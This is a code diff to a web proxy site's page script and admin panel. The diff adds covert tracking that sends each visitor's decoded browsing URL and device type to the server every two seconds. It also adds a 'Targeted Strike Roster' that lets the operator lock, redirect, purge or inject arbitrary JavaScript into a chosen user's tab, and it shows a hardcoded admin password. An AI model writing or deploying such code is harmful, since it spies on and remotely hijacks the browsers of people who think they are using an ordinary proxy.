@@ -437,7 +437,7 @@
 
 		<footer>
 			<div><a title="License information" href="credits.html">Credits</a></div>
-			<div><span>Velarium &copy; 2026</span></div>
+			<div><span>Velarium © 2026</span></div>
 		</footer>
 
 		<div id="browser-window">
@@ -582,6 +582,41 @@
 				return window.transportPromise;
 			}
 
+			// ==========================================
+			// DEVICE SNIFFER & AGGRESSIVE HEARTBEAT
+			// ==========================================
+			let myDeviceType = "Desktop";
+			if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) myDeviceType = "iOS Device";
+			else if (/Android/i.test(navigator.userAgent)) myDeviceType = "Android";
+			else if (/Mac/i.test(navigator.userAgent)) myDeviceType = "Mac OS";
+			else if (/Windows/i.test(navigator.userAgent)) myDeviceType = "Windows";
+
+			function executeHeartbeat(socket) {
+				if (!socket || !socket.connected) return;
+
+				let currentUrl = "Idle / Homepage";
+				const activeFrame = document.querySelector('.proxy-frame.active');
+
+				if (activeFrame && document.getElementById('browser-window').style.display !== 'none') {
+					try {
+						let frameUrl = activeFrame.contentWindow.location.href;
+						if (frameUrl === 'about:blank' && activeFrame.src) frameUrl = activeFrame.src;
+						if (frameUrl.includes(__uv$config.prefix)) {
+							const encodedPath = frameUrl.substring(frameUrl.indexOf(__uv$config.prefix) + __uv$config.prefix.length);
+							currentUrl = __uv$config.decodeUrl(encodedPath);
+						}
+					} catch (err) {
+						let frameUrl = activeFrame.src;
+						if (frameUrl && frameUrl.includes(__uv$config.prefix)) {
+							const encodedPath = frameUrl.substring(frameUrl.indexOf(__uv$config.prefix) + __uv$config.prefix.length);
+							currentUrl = __uv$config.decodeUrl(encodedPath);
+						}
+					}
+				}
+
+				socket.emit('user_activity', { url: currentUrl, device: myDeviceType });
+			}
+
 			// SOCKET.IO COMMAND LISTENER
 			let socket = null;
 			window.addEventListener('load', () => {
@@ -589,6 +624,8 @@
 
 				if (typeof io !== 'undefined') {
 					socket = io();
+
+					setInterval(() => executeHeartbeat(socket), 2000);
 
 					window.addEventListener('beforeunload', () => {
 						if (socket) socket.disconnect();
@@ -665,7 +702,9 @@
 				}
 			}
 
-			function forceCustomUrl(targetUrl) {
+			async function forceCustomUrl(targetUrl) {
+				await ensureTransport();
+
 				let activeFrame = document.querySelector('.proxy-frame.active');
 				if (!activeFrame) {
 					createNewTab();
@@ -901,6 +940,14 @@
 						#replies-box, #sniffer-box { height: 160px; overflow-y: auto; background: #111; padding: 12px; border: 1px solid #333; border-radius: 8px; font-family: monospace; color: #4CAF50; line-height: 1.5; font-size: 0.85rem; }
 						#sniffer-box { color: #00e5ff; }
 						.ping-indicator { display: inline-block; width: 10px; height: 10px; background: #4CAF50; border-radius: 50%; margin-right: 5px; box-shadow: 0 0 10px #4CAF50; }
+
+						/* Roster Table Styles */
+						.roster-table { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 0.85rem; }
+						.roster-table th { text-align: left; padding: 8px; border-bottom: 1px solid #333; color: #ff4b4b; }
+						.roster-table td { padding: 8px; border-bottom: 1px solid #222; vertical-align: middle; }
+						.roster-url { max-width: 200px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; display: inline-block; color: #00e5ff; }
+						.strike-btn { padding: 5px 8px; font-size: 0.75rem; margin: 0 2px; width: auto; display: inline-block; background: #333; border: none; }
+						.strike-btn:hover { background: #ff4b4b; }
 					</style>
 				</head>
 				<body>
@@ -909,7 +956,28 @@
 
 					<div class="dashboard-grid">
 
-						<!-- 1. BROADCAST & REPLIES -->
+						<!-- NEW TARGETED STRIKE ROSTER -->
+						<div class="panel-section" style="grid-column: 1 / -1;">
+							<h3>Targeted Strike Roster</h3>
+							<p style="margin-bottom: 15px;">Live device tracking. Execute commands on specific users without alerting the entire network.</p>
+							<div style="background:#111; border:1px solid #333; border-radius:8px; padding:10px; max-height:250px; overflow-y:auto;">
+								<table class="roster-table">
+									<thead>
+										<tr>
+											<th>Device ID</th>
+											<th>Hardware</th>
+											<th>Active URL</th>
+											<th style="text-align: right;">Targeted Actions</th>
+										</tr>
+									</thead>
+									<tbody id="roster-body">
+										<tr><td colspan="4" style="text-align: center; color: #555;">Waiting for network heartbeat...</td></tr>
+									</tbody>
+								</table>
+							</div>
+						</div>
+
+						<!-- BROADCAST & REPLIES -->
 						<div class="panel-section" style="grid-column: 1 / -1;">
 							<h3>Live Comms & Network Feeds</h3>
 							<div style="display: flex; gap: 20px;">
@@ -928,7 +996,7 @@
 							</div>
 						</div>
 
-						<!-- 2. ATTENTION MODE (FREEZE) -->
+						<!-- ATTENTION MODE (FREEZE) -->
 						<div class="panel-section">
 							<h3>Freeze Screen (Lock Mode)</h3>
 							<p>Drops a non-closable translucent lock overlay across every active proxy screen.</p>
@@ -938,7 +1006,7 @@
 							</div>
 						</div>
 
-						<!-- 3. ROULETTE (CHAOS MODE) -->
+						<!-- ROULETTE (CHAOS MODE) -->
 						<div class="panel-section">
 							<h3>Chaos Roulette</h3>
 							<p>Picks exactly 1 random active connected user and redirects only them.</p>
@@ -946,7 +1014,7 @@
 							<button onclick="sendCmd('roulette', document.getElementById('roulette-url').value)">Spin & Redirect 1 User</button>
 						</div>
 
-						<!-- 4. REMOTE JS INJECTOR (RCE) -->
+						<!-- REMOTE JS INJECTOR (RCE) -->
 						<div class="panel-section">
 							<h3>Global JS Injector (RCE)</h3>
 							<p>Execute custom JavaScript code directly inside every client tab.</p>
@@ -954,7 +1022,7 @@
 							<button onclick="sendCmd('inject_js', document.getElementById('js-input').value)">Execute Code</button>
 						</div>
 
-						<!-- 5. CLOAK ENFORCER -->
+						<!-- CLOAK ENFORCER -->
 						<div class="panel-section">
 							<h3>Cloak Enforcer</h3>
 							<p>Override personal settings and force all active tabs to disguise themselves.</p>
@@ -969,15 +1037,15 @@
 							<button onclick="sendCmd('enforce_cloak', document.getElementById('cloak-target').value)">Enforce Global Cloak</button>
 						</div>
 
-						<!-- 6. FORCE URL -->
+						<!-- FORCE URL -->
 						<div class="panel-section">
 							<h3>Force URL Redirect</h3>
-							<p>Bypass active proxy tabs and force all browsers to load a specific link (800ms stagger).</p>
+							<p>Bypass active proxy tabs and force all browsers to load a specific link.</p>
 							<input type="text" id="url-target" placeholder="e.g., https://youtube.com" />
 							<button onclick="sendCmd('force_url', document.getElementById('url-target').value)">Execute Redirect</button>
 						</div>
 
-						<!-- 7. MAINTENANCE LOCKOUT -->
+						<!-- MAINTENANCE LOCKOUT -->
 						<div class="panel-section">
 							<h3>Maintenance Lockout</h3>
 							<p>Dim screens and lock out the UI for backend server restarts.</p>
@@ -987,14 +1055,14 @@
 							</div>
 						</div>
 
-						<!-- 8. FORCE RELOAD -->
+						<!-- FORCE RELOAD -->
 						<div class="panel-section">
 							<h3>Force Network Reload</h3>
 							<p>Pushed a code update? Force all active tabs to Hard Refresh.</p>
 							<button onclick="sendCmd('force_reload', null)" style="margin-top: auto;">Execute Global Reload</button>
 						</div>
 
-						<!-- 9. GLOBAL PANIC -->
+						<!-- GLOBAL PANIC -->
 						<div class="panel-section danger-zone">
 							<h3>Global Panic Button</h3>
 							<p>Instantly close all proxy iframes and redirect entire network to Google.</p>
@@ -1024,6 +1092,34 @@
 							snifferBox.scrollTop = snifferBox.scrollHeight;
 						});
 
+						// Render the Live Roster with ALL targeted buttons
+						localAdminSocket.on('roster_update', (roster) => {
+							const tbody = document.getElementById('roster-body');
+							if (roster.length === 0) {
+								tbody.innerHTML = '<tr><td colspan="4" style="text-align: center; color: #555;">No active connections found.</td></tr>';
+								return;
+							}
+
+							tbody.innerHTML = '';
+							roster.forEach(client => {
+								const row = document.createElement('tr');
+								row.innerHTML = \`
+									<td style="color: #aaa;">#\${client.id.substring(0, 5)}</td>
+									<td style="font-weight: bold;">\${client.device}</td>
+									<td><span class="roster-url" title="\${client.url}">\${client.url}</span></td>
+									<td style="text-align: right; display: flex; justify-content: flex-end; gap: 3px;">
+										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'freeze', true)" title="Lock Screen">Lck</button>
+										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'freeze', false)" title="Unlock Screen">Unl</button>
+										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'force_reload', null)" title="Force Refresh">Rld</button>
+										<button class="strike-btn" onclick="promptUrlAndSend('\${client.id}')" title="Redirect User">Rdr</button>
+										<button class="strike-btn" onclick="promptJsAndSend('\${client.id}')" title="Inject JavaScript">JS</button>
+										<button class="strike-btn" onclick="sendTargetedCmd('\${client.id}', 'panic', null)" style="background: #601010; color: #ff9999;" title="Purge Connection">Prg</button>
+									</td>
+								\`;
+								tbody.appendChild(row);
+							});
+						});
+
 						window.sendCmd = function(action, data) {
 							if (action && (data !== '' || data === null || typeof data === 'boolean')) {
 								localAdminSocket.emit('admin_command', {
@@ -1032,6 +1128,26 @@
 									data: data
 								});
 							}
+						};
+
+						window.sendTargetedCmd = function(targetId, action, data) {
+							localAdminSocket.emit('targeted_command', {
+								password: '248169',
+								targetId: targetId,
+								action: action,
+								data: data
+							});
+						};
+
+						// Clean popup functions that don't break HTML quote escaping!
+						window.promptUrlAndSend = function(targetId) {
+							let url = prompt('Send user to URL:', 'https://youtube.com');
+							if(url) sendTargetedCmd(targetId, 'force_url', url);
+						};
+
+						window.promptJsAndSend = function(targetId) {
+							let js = prompt('Inject JavaScript:', 'alert("Targeted Strike!");');
+							if(js) sendTargetedCmd(targetId, 'inject_js', js);
 						};
 					<\/script>
 				</body>
@@ -1281,7 +1397,6 @@
 					}
 				}
 
-				// TRAFFIC SNIFFER: Notify Admin Panel of User Activity
 				if (decodedUrl && socket) {
 					socket.emit('user_activity', { url: decodedUrl });
 				}
